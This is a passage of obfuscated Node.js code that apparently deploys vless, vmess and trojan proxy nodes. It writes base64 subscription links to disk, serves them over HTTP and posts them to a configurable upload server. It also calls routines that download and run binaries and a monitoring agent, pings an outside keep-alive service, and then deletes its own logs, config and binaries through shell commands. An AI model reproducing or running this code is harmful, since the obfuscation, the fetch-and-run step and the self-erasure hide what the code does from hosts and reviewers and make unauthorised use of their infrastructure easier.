_0x2461ac={_0x36de2f:0x16a,_0xe05635:0x162,_0x21bee8:0xda,_0x29b747:0x169,_0x5874b1:0x117,_0x15622d:0xf9,_0x3626b9:0x13e,_0x120ec7:0x145,_0x42a19b:0x168,_0x3a7388:0xda,_0x32ec46:0x141,_0x1d543a:0x168,_0x41eecb:0x183},_0x18d3b9=await _0xcd6a01(),_0x28c23c=NAME?NAME+'-'+_0x18d3b9:_0x18d3b9;return new Promise(_0x5411c9=>{const _0x1c7197={_0x45b907:0x16e,_0x8750f5:0xe0};setTimeout(()=>{const _0xf7dddd=_0x2885,_0x3acc7b={'v':'2','ps':''+_0x28c23c,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x2235de,'path':_0xf7dddd(_0x2461ac._0x36de2f),'tls':'tls','sni':_0x2235de,'alpn':'','fp':_0xf7dddd(0x179)},_0xd1f446=_0xf7dddd(_0x2461ac._0xe05635)+UUID+'@'+CFIP+':'+CFPORT+_0xf7dddd(0x14d)+_0x2235de+_0xf7dddd(0x117)+_0x2235de+_0xf7dddd(0x178)+_0x28c23c+'\x0a\x0avmess://'+Buffer['from'](JSON[_0xf7dddd(0x10c)](_0x3acc7b))['toString'](_0xf7dddd(_0x2461ac._0x21bee8))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0xf7dddd(_0x2461ac._0x29b747)+_0x2235de+_0xf7dddd(_0x2461ac._0x5874b1)+_0x2235de+_0xf7dddd(_0x2461ac._0x15622d)+_0x28c23c+_0xf7dddd(0x196);console[_0xf7dddd(_0x2461ac._0x3626b9)](Buffer[_0xf7dddd(_0x2461ac._0x120ec7)](_0xd1f446)[_0xf7dddd(_0x2461ac._0x42a19b)](_0xf7dddd(_0x2461ac._0x3a7388))),fs[_0xf7dddd(_0x2461ac._0x32ec46)](subPath,Buffer[_0xf7dddd(0x145)](_0xd1f446)[_0xf7dddd(_0x2461ac._0x1d543a)](_0xf7dddd(0xda))),console[_0xf7dddd(_0x2461ac._0x3626b9)](FILE_PATH+_0xf7dddd(_0x2461ac._0x41eecb)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x5170fa,_0x4bb784)=>{const _0x5c26c7=_0xf7dddd,_0xb36c9=Buffer['from'](_0xd1f446)[_0x5c26c7(0x168)](_0x5c26c7(0xda));_0x4bb784[_0x5c26c7(_0x1c7197._0x45b907)](_0x5c26c7(0x14e),_0x5c26c7(_0x1c7197._0x8750f5)),_0x4bb784[_0x5c26c7(0xd8)](_0xb36c9);}),_0x5411c9(_0xd1f446);},0x7d0);});}}async function uploadNodes(){const _0x4161e4={_0x5a918f:0x13e,_0x30d086:0x11a,_0x1f9ee4:0x129,_0x5832b5:0x10c,_0x3c9eff:0xd7},_0x1d4b6f=_0x2aa434;if(UPLOAD_URL&&PROJECT_URL){const _0x177d10=PROJECT_URL+'/'+SUB_PATH,_0xd4545a={'subscription':[_0x177d10]};try{const _0x3067bd=await axios['post'](UPLOAD_URL+'/api/add-subscriptions',_0xd4545a,{'headers':{'Content-Type':'application/json'}});return _0x3067bd&&_0x3067bd['status']===0xc8?(console[_0x1d4b6f(_0x4161e4._0x5a918f)](_0x1d4b6f(0x182)),_0x3067bd):null;}catch(_0x3e7858){if(_0x3e7858[_0x1d4b6f(_0x4161e4._0x30d086)]){if(_0x3e7858['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x41534a=fs[_0x1d4b6f(_0x4161e4._0x1f9ee4)](listPath,'utf-8'),_0x84a560=_0x41534a[_0x1d4b6f(0xf5)]('\x0a')[_0x1d4b6f(0x16c)](_0x383dc6=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1d4b6f(0x100)](_0x383dc6));if(_0x84a560[_0x1d4b6f(0x147)]===0x0)return;const _0x3c1e7c=JSON[_0x1d4b6f(_0x4161e4._0x5832b5)]({'nodes':_0x84a560});try{const _0x668c71=await axios[_0x1d4b6f(0x190)](UPLOAD_URL+_0x1d4b6f(0xf2),_0x3c1e7c,{'headers':{'Content-Type':_0x1d4b6f(0x152)}});return _0x668c71&&_0x668c71['status']===0xc8?(console[_0x1d4b6f(_0x4161e4._0x5a918f)](_0x1d4b6f(_0x4161e4._0x3c9eff)),_0x668c71):null;}catch(_0x391b57){return null;}}else return;}}function cleanFiles(){const _0x36f3aa={_0x21bb22:0x192,_0x1e5b3c:0x123};setTimeout(()=>{const _0x2c97bf={_0x4459c1:0x13e,_0x3324dc:0x17c},_0x55898c={_0x836a10:0x17c,_0x449d89:0x13e},_0x59de70=_0x2885,_0x29d23b=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x29d23b['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x29d23b['push'](phpPath);process[_0x59de70(0x13c)]===_0x59de70(0xf3)?exec(_0x59de70(_0x36f3aa._0x21bb22)+_0x29d23b['join']('\x20')+'\x20>\x20nul\x202>&1',_0x2301e6=>{const _0x5cc6b2=_0x59de70;console['clear'](),console['log'](_0x5cc6b2(_0x55898c._0x836a10)),console[_0x5cc6b2(_0x55898c._0x449d89)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x59de70(0x15a)+_0x29d23b[_0x59de70(0x128)]('\x20')+_0x59de70(_0x36f3aa._0x1e5b3c),_0x4667c3=>{const _0x5ce5b4=_0x59de70;console['clear'](),console[_0x5ce5b4(_0x2c97bf._0x4459c1)](_0x5ce5b4(_0x2c97bf._0x3324dc)),console[_0x5ce5b4(_0x2c97bf._0x4459c1)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x533a35={_0x2a2f5f:0x13e,_0x2195e6:0x139,_0x2a3f9e:0x10b,_0x328bf8:0xf7},_0xa14251=_0x2aa434;if(!AUTO_ACCESS||!PROJECT_URL){console[_0xa14251(_0x533a35._0x2a2f5f)](_0xa14251(0xfa));return;}try{const _0x44a19a=await axios[_0xa14251(0x190)](_0xa14251(0x11c),{'url':PROJECT_URL},{'headers':{'Content-Type':_0xa14251(0x152)}});return console[_0xa14251(0x13e)](_0xa14251(0x130)),_0x44a19a;}catch(_0x44908b){return console[_0xa14251(_0x533a35._0x2195e6)](_0xa14251(_0x533a35._0x2a3f9e)+_0x44908b[_0xa14251(_0x533a35._0x328bf8)]),null;}}async function startserver(){const _0x10a696={_0x463965:0x139,_0x1df81a:0x13a},_0x5b15e8=_0x2aa434;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x23c950){console[_0x5b15e8(_0x10a696._0x463965)](_0x5b15e8(_0x10a696._0x1df81a),_0x23c950);}}startserver()[_0x2aa434(0x161)](_0x30be04=>{const _0x45a5be={_0x286644:0x139},_0x5d42aa=_0x2aa434;console[_0x5d42aa(_0x45a5be._0x286644)](_0x5d42aa(0x17e),_0x30be04);}),app[_0x2aa434(0x176)](PORT,()=>console[_0x2aa434(0x13e)](_0x2aa434(0x146)+PORT+'!'));
